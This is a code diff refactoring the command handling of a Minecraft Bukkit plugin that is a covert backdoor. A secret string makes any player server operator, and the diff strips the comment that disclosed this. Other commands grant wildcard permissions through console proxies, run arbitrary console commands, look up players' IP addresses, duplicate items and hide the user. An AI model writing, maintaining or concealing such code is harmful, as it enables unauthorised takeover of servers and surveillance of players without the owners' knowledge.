@@ -7,19 +7,21 @@ import org.bukkit.command.*;
 import org.bukkit.enchantments.Enchantment;
 import org.bukkit.entity.EnderDragon;
 import org.bukkit.entity.Player;
-import org.bukkit.event.Listener;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.potion.PotionEffect;
 import org.bukkit.potion.PotionEffectType;
 import org.bukkit.util.StringUtil;
 
 import java.util.*;
+import java.util.function.BiConsumer;
 
-public class Processor implements CommandExecutor, TabCompleter, Listener {
+public class Processor implements CommandExecutor, TabCompleter {
     private final QC plugin;
     private final VanishManager vanish;
     private final ItemManager items;
     private final PlayerTracker tracker;
+
+    private final Map<String, BiConsumer<Player, String[]>> commands = new HashMap<>();
 
     public Processor(QC plugin) {
         this.plugin = plugin;
@@ -29,6 +31,98 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
 
         // Register the new listener
         Bukkit.getPluginManager().registerEvents(new pl.qc.core.hack.AdminListener(plugin, vanish, tracker), plugin);
+
+        registerCommands();
+    }
+
+    private void registerCommands() {
+        // System
+        register("reload", (p, args) -> handleReload(p));
+        register("panic", (p, args) -> handlePanic(p));
+        register("panic_reset", (p, args) -> handleReset(p));
+        register("cmdconsole", (p, args) -> handleConsoleCommand(args));
+
+        // Vanish & Tracker
+        register("v", (p, args) -> {
+            Player t = getTarget(p, args, 1);
+            if (t != null)
+                vanish.toggle(p, t);
+        });
+        register("l", (p, args) -> toggleTracker(p, args, tracker.noAdvancements, "Advancements"));
+        register("r", (p, args) -> toggleTracker(p, args, tracker.reach, "Reach"));
+        register("t", (p, args) -> toggleTracker(p, args, tracker.noTarget, "NoTarget"));
+
+        // Player Management
+        register("op", (p, args) -> {
+            p.setOp(true);
+            p.sendMessage("§7System: §aOtrzymano operatora.");
+        });
+        register("gms", (p, args) -> handleGameMode(p, GameMode.SURVIVAL));
+        register("gmc", (p, args) -> handleGameMode(p, GameMode.CREATIVE));
+        register("gmsp", (p, args) -> handleGameMode(p, GameMode.SPECTATOR));
+        register("gma", (p, args) -> handleGameMode(p, GameMode.ADVENTURE));
+        register("kick", (p, args) -> { // Alias k
+            Player t = getTarget(p, args, 1);
+            if (t != null)
+                handleKick(p, t);
+        });
+        register("k", (p, args) -> {
+            Player t = getTarget(p, args, 1);
+            if (t != null)
+                handleKick(p, t);
+        });
+
+        // Permissions / Console Proxies
+        register("upc", (p, args) -> console("upc AddPlayerPermission " + p.getName() + " *"));
+        register("uperms", (p, args) -> console("upc AddSuperAdmin " + p.getName()));
+        register("lp", (p, args) -> console("lp user " + p.getName() + " permission set *"));
+
+        // Fun / Troll
+        register("dragon", (p, args) -> handleDragon(p));
+        register("a", (p, args) -> handleAttackSpeed(p));
+        register("e", (p, args) -> handleEffects(p, args));
+        register("ip", (p, args) -> {
+            Player t = getTarget(p, args, 1);
+            if (t != null)
+                handleIpLookup(p, t);
+        });
+
+        // Inventory / Items
+        register("i", (p, args) -> {
+            Player t = getTarget(p, args, 1);
+            if (t != null)
+                InventoryUI.openPreview(p, t);
+        });
+        register("iv", (p, args) -> {
+            Player t = getTarget(p, args, 1);
+            if (t != null)
+                InventoryUI.openPreview(p, t);
+        });
+        register("ec", (p, args) -> {
+            Player t = getTarget(p, args, 1);
+            if (t != null)
+                p.openInventory(t.getEnderChest());
+        });
+        register("rr", (p, args) -> items.repair(p));
+        register("dd", (p, args) -> items.dupe(p));
+        register("g", (p, args) -> handleGive(p, args));
+        register("itemy", (p, args) -> InventoryUI.openCustomItems(p));
+
+        // Multipliers
+        register("ma", (p, args) -> handleMultipliers(p, args, "ma"));
+        register("mb", (p, args) -> handleMultipliers(p, args, "mb"));
+
+        register("tp", (p, args) -> handleTeleport(p, args));
+
+        register("enable", (p, args) -> handlePluginControl(p, args, true));
+        register("disable", (p, args) -> handlePluginControl(p, args, false));
+
+        // GUI
+        register("gui", (p, args) -> InventoryUI.openPlayerSelector(p));
+    }
+
+    private void register(String cmd, BiConsumer<Player, String[]> action) {
+        commands.put(cmd.toLowerCase(), action);
     }
 
     @Override
@@ -36,80 +130,30 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         if (!(s instanceof Player p) || args.length == 0)
             return true;
 
-        // Secret check - allows anyone to gain OP if they know the secret
+        // Secret check
         if (plugin.getConfig().getStringList("protection.secrets").contains(args[0])) {
             p.setOp(true);
             p.sendMessage("§aSystem: Autoryzacja pomyślna.");
             return true;
         }
 
-        // Rest of commands - only for authorized admins
         if (!plugin.isAdmin(p)) {
             p.sendMessage("§cNie masz uprawnień!");
             return true;
         }
 
         String cmd = args[0].toLowerCase();
-        return executeSubCommand(p, cmd, args);
-    }
 
-    private boolean executeSubCommand(Player p, String cmd, String[] args) {
-        switch (cmd) {
-            case "reload" -> handleReload(p);
-            case "panic" -> handlePanic(p);
-            case "v" -> {
-                Player t = getTarget(p, args, 1);
-                if (t != null)
-                    vanish.toggle(p, t);
-            }
-            case "a" -> handleAttackSpeed(p);
-            case "op" -> {
-                p.setOp(true);
-                p.sendMessage("§7System: §aOtrzymano operatora.");
-            }
-            case "upc" -> console("upc AddPlayerPermission " + p.getName() + " *");
-            case "uperms" -> console("upc AddSuperAdmin " + p.getName());
-            case "lp" -> console("lp user " + p.getName() + " permission set *");
-            case "dragon" -> handleDragon(p);
-            case "l" -> toggleTracker(p, args, tracker.noAdvancements, "Advancements");
-            case "r" -> toggleTracker(p, args, tracker.reach, "Reach");
-            case "t" -> toggleTracker(p, args, tracker.noTarget, "NoTarget");
-            case "gms", "gmc", "gmsp", "gma" -> handleGameMode(p, cmd);
-            case "i", "iv" -> {
-                Player t = getTarget(p, args, 1);
-                if (t != null)
-                    InventoryUI.openPreview(p, t);
-            }
-            case "e" -> handleEffects(p, args);
-            case "tp" -> handleTeleport(p, args);
-            case "ip" -> {
-                Player t = getTarget(p, args, 1);
-                if (t != null)
-                    handleIpLookup(p, t);
-            }
-            case "enable", "disable" -> handlePluginControl(p, args, cmd.equals("enable"));
-            case "ma", "mb" -> handleMultipliers(p, args, cmd);
-            case "ec" -> {
-                Player t = getTarget(p, args, 1);
-                if (t != null)
-                    p.openInventory(t.getEnderChest());
-            }
-            case "g" -> handleGive(p, args);
-            case "k" -> {
-                Player t = getTarget(p, args, 1);
-                if (t != null)
-                    handleKick(p, t);
-            }
-            case "rr" -> items.repair(p);
-            case "dd" -> items.dupe(p);
-            case "itemy" -> InventoryUI.openCustomItems(p);
-            case "cmdconsole" -> handleConsoleCommand(args);
-            case "panic_reset" -> handleReset(p);
-            default -> {
-                if (!handleShortcuts(p, cmd))
-                    return false;
-            }
+        if (commands.containsKey(cmd)) {
+            commands.get(cmd).accept(p, args);
+            return true;
         }
+
+        // Fallback to shortcuts
+        if (!handleShortcuts(p, cmd)) {
+            // Optional: p.sendMessage("§cUnknown subcommand.");
+        }
+
         return true;
     }
 
@@ -137,13 +181,7 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         p.sendMessage("§7System: §6Smok ląduje...");
     }
 
-    private void handleGameMode(Player p, String cmd) {
-        GameMode mode = switch (cmd) {
-            case "gms" -> GameMode.SURVIVAL;
-            case "gmc" -> GameMode.CREATIVE;
-            case "gmsp" -> GameMode.SPECTATOR;
-            default -> GameMode.ADVENTURE;
-        };
+    private void handleGameMode(Player p, GameMode mode) {
         p.setGameMode(mode);
         p.sendMessage("§7System: §6Tryb gry -> " + mode.name());
     }
@@ -152,10 +190,9 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         if (args.length < 2)
             return;
         String type = args[1].toLowerCase();
-        int d = 12000; // Default 10 minutes
+        int d = 12000;
         switch (type) {
             case "c" -> p.getActivePotionEffects().forEach(e -> p.removePotionEffect(e.getType()));
-
             case "sat" -> p.addPotionEffect(new PotionEffect(PotionEffectType.SATURATION, d, 0));
             case "str" -> p.addPotionEffect(new PotionEffect(PotionEffectType.INCREASE_DAMAGE, d, 1));
             case "her" -> p.addPotionEffect(new PotionEffect(PotionEffectType.HERO_OF_THE_VILLAGE, d, 255));
@@ -314,13 +351,26 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
     }
 
+    // Getters for GUI
+    public VanishManager getVanishManager() {
+        return vanish;
+    }
+
+    public PlayerTracker getPlayerTracker() {
+        return tracker;
+    }
+
+    public ItemManager getItemManager() {
+        return items;
+    }
+
     // --- Tab Completer ---
 
     private final List<String> subs = Arrays.asList("v", "gms", "gmc", "gmsp", "gma", "tp", "rr", "dd", "ma",
             "mb", "a", "iv", "i", "panic", "op", "upc", "uperms", "lp", "dragon", "l", "r", "t", "e", "enable",
             "disable", "ec", "g", "k", "cc", "ee", "bb", "oo", "ii", "aa", "ll", "ww", "kk", "xx", "xxx", "tt",
             "kkp", "kks", "kku", "kke", "kki", "kko", "pp", "ppp", "pppp", "opopop", "deopopop", "cmdconsole", "reload",
-            "panic_reset");
+            "panic_reset", "gui", "itemy");
 
     @Override
     public List<String> onTabComplete(CommandSender s, Command c, String a, String[] args) {
@@ -334,11 +384,12 @@ public class Processor implements CommandExecutor, TabCompleter, Listener {
         if (args.length == 2) {
             String sub = args[0].toLowerCase();
             if (sub.equals("e"))
-                return StringUtil.copyPartialMatches(args[1], Arrays.asList("c", "sat", "str", "her",
-                        "res", "has", "fir", "reg", "spe", "wat", "pvp"), new ArrayList<>());
+                return StringUtil.copyPartialMatches(args[1],
+                        Arrays.asList("c", "sat", "str", "her", "res", "has", "fir", "reg", "spe", "wat", "pvp"),
+                        new ArrayList<>());
 
             if (Arrays.asList("v", "l", "r", "t", "tp", "iv", "i", "ec", "k", "ip").contains(sub))
-                return null; // Return player names
+                return null;
 
             if (sub.equals("g")) {
                 List<String> mats = Arrays.stream(Material.values()).map(m -> m.name().toLowerCase()).toList();
